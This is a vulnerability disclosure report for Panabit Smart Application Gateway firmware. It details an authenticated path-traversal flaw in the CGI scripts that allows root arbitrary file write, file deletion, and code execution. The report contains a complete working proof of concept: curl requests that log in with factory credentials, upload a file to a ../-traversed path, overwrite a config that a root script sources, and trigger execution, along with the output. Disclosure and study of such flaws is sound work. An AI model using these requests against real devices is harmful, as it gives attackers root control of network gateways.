# Panabit Smart Application Gateway

- Vendor: Beijing Panabit Software Co., Ltd. (Panabit)
- Product: Panabit Smart Application Gateway / Internet Behavior Management (PanabitFREE edition; same-source SMB/OEM/MGW series)
- Firmware Version: TANGr7p10 (`PanabitFREE_TANGr7p10_20260817_Linux3`, built 2026-08-17, x86-64)
- Vulnerability Type: Authenticated arbitrary file write/delete → root code execution (CWE-22 Path Traversal / CWE-434 / CWE-78)

## Overview

All shell CGIs of the Panabit backend are spawned by `ipe_httpd` as **root**, and `ipe_httpd` **exports every request parameter verbatim as a `CGI_<name>` environment variable**. The scripts then use these variables **directly as local file paths** in `mv` / `rm -rf` / `cat` operations, with no path canonicalization, no whitelist and no `..` filtering anywhere. In `sac/ajax_sac_ap`, `action=import_upgrde`, `mv ${CGI_file} ${DATAPATH}/sac/${CGI_filename}` (line 766) has both parameters attacker-controlled — the `file` field decides "what is written", the `filename` field decides "where it is written", so a single multipart request completes a root arbitrary write:

```bash
curl -sk -b "$CK" "https://127.0.0.1:18443/cgi-bin/sac/ajax_sac_ap" -F 'action=import_upgrde' -F 'model=zzmod' -F 'file=@/tmp/qtest/payload.sh' -F 'filename=../../../../../../tmp/qtest/out3.sh'
```

`system/ajax_modkey`'s `rm -rf ${CGI_file}` (`action=upload_modkey`) additionally yields root arbitrary file/directory deletion. The written file is always **0644**, so the RCE is realized through the "write config → `source`d by a root CGI" chain (`source` requires no executable bit), which is the basis of this report.

## Vulnerability Details

**(1) Write sink** — `admin/cgi-bin/sac/ajax_sac_ap` → `import_upgrde()`, line 766:

```sh
    mv ${CGI_file} ${DATAPATH}/sac/${CGI_filename}          # ← line 766：两个参数都是攻击者可控

    . /${PGETC}/ifadmin.conf                               # ← line 771：下一次请求会 source 此文件
```

**(2) Delete sink** — `admin/cgi-bin/system/ajax_modkey` → `upload_modkey()`:

```sh
	license=`cat ${CGI_file}`                              # ← line 57：任意路径读取（文件存在性探测）
    ...
    rm -rf ${CGI_file}                                     # ← line 63：root 任意文件/目录删除
```

**Root cause**: `ipe_httpd` exports every request parameter as a `CGI_<name>` environment variable. The CGI authors intended to treat "the uploaded file" and "the target file name" as plain strings, but:

1. `${CGI_filename}` is concatenated directly into the **target path** of `mv`, with no `basename` and no `..` filtering;
2. although `${CGI_file}` is generated by httpd as a temporary path, the script applies no validation to its **reads and deletes** (`cat ${CGI_file}`, `rm -rf ${CGI_file}`); in the **plain-form scenario `CGI_file` is simply the attacker-controlled string itself** (httpd exports a same-named form field directly);
3. all CGIs run as **root**, so the privilege level reached is root.

The `CGI_file` variable family appears in 36 scripts under `admin/cgi-bin/`; only two of them (`system/ajax_sys_log`, `common/ajax_download`) implement a `dirname` whitelist check, while the others apply no such check. This is consistent with an **incomplete fix** rather than intended behavior.

**Key pitfall (stated honestly)**: `mv` moves the temporary file httpd created with `fopen(...,"w+")`, whose permissions are **always 0644**; `mv` preserves the source inode's permission bits ⇒ the written file is also **0644**. Therefore "arbitrary file write" must not be equated with "a dropped CGI can be executed" — without `chmod`, a `GET` on that CGI returns `<H4>500 Internal Error</H4>`. The RCE claim of this report rests on the "write config → `.`(source)d by a root CGI" chain, because `source` **does not require the executable bit** (mode-agnostic) and is the most stable, most reproducible path.

## Proof of Concept

**Prerequisite**: set up the environment on the analysis host 192.168.35.137 (symlink `/usr/ramdisk` + `/etc/PG.conf` + `ipe_httpd -C httpd.conf`, port 18443).

**Step 1 — log in to obtain a session Cookie** (factory credentials admin/panabit, esctool-encoded 32-hex):

```bash
CK=$(curl -sk -i -X POST https://127.0.0.1:18443/login/user.cgi \
  -d 'action=local_login&palang=ch' \
  -d 'username=590b62dd4a42161f3bcfa16e2baf6b33' \
  -d 'password=ee5c4080bbe094ffb47a84b32b8cabd8' \
  | tr -d '\r' | grep -i '^set-cookie:' | sed 's/^[Ss]et-[Cc]ookie: //; s/;.*//')
echo "$CK"
```

**Step 2 — arbitrary file write** (post-auth; first create the file to upload):

```bash
# ① create the payload file first (/tmp/qtest is root-owned; use sudo, or put it at /tmp/payload.sh)
echo 'RCE-TEST' | sudo tee /tmp/qtest/payload.sh

# ② upload: file = content, filename = target path (../ traverses to any location)
curl -sk -i -b "$CK" "https://127.0.0.1:18443/cgi-bin/sac/ajax_sac_ap" \
  -F 'action=import_upgrde' \
  -F 'model=zzmod' \
  -F 'file=@/tmp/qtest/payload.sh' \
  -F 'filename=../../../../../../tmp/qtest/out3.sh'
```

Response: `{ "code": 0, "msg": "OK", "data": OK}`; `/tmp/qtest/out3.sh` lands with owner root and byte-for-byte-identical content.

**Step 3 — write config → `source`d by a root CGI → root code execution**:

```bash
# ① create the payload file (content = the commands to run when sourced)
printf 'id>/tmp/qtest/marker2.txt;echo RCE-SOURCED-OK>>/tmp/qtest/marker2.txt\n' | sudo tee /tmp/qtest/inj2.conf

# ② overwrite ifadmin.conf (../ traverses to the config under PGETC)
curl -sk -b "$CK" "https://127.0.0.1:18443/cgi-bin/sac/ajax_sac_ap" \
  -F 'action=import_upgrde' -F 'model=zzmod' \
  -F 'file=@/tmp/qtest/inj2.conf' \
  -F 'filename=../../panaetc/ifadmin.conf'
```

Response: `{ "code": 0, "msg": "OK", "data": OK}`; `/tmp/pb_sim/panaetc/ifadmin.conf` is written as root.

Trigger the `source` (any ordinary request works):

```bash
curl -sk -b "$CK" "https://127.0.0.1:18443/cgi-bin/sac/ajax_sac_ap" -d 'action=list_sac_ap' -o /dev/null -w 'trigger_http=%{http_code}\n'
```

Expected: `trigger_http=200`, then the marker file appears (see Reproduction Result).

## Impact

An authenticated attacker gains **root code execution** and **root arbitrary file/directory deletion**: they can wholly replace the main config `panabit.conf`, the HTTPS certificate `admin.pem`, `license.dat`, and `sigdb.tar.gz` for a persistent backdoor; delete the firmware's own files/directories for denial of service; and the same file-path pattern recurs across the CGI tree (the `CGI_file` family alone appears in 36 scripts), so point fixes are easily missed. Only one valid backend session is required (default `admin`/`panabit` credentials are common on devices where the password was never changed); no user interaction.

## Reproduction Result

Verified end-to-end against the real `ipe_httpd` (HTTPS 18443):

Arbitrary file write (note the owner is root):

```
$ ls -l /tmp/qtest/out3.sh
-rw-r--r-- 1 root root 28 /tmp/qtest/out3.sh
```

Write config → `source` → code execution (read the marker file):

```
$ cat /tmp/qtest/marker2.txt
uid=0(root) gid=0(root) groups=0(root)
RCE-SOURCED-OK
```

Root arbitrary file deletion (`system/ajax_modkey`, `--data-urlencode 'file=/tmp/qtest/del_a.txt'`):

```
$ ls /tmp/qtest/del_a.txt
ls: cannot access '/tmp/qtest/del_a.txt': No such file or directory
```

The code executed as root with retrievable output. Only non-destructive commands (`id`) were used; no reboot/restore/upgrade was invoked, and all planted artifacts were cleaned up after validation.
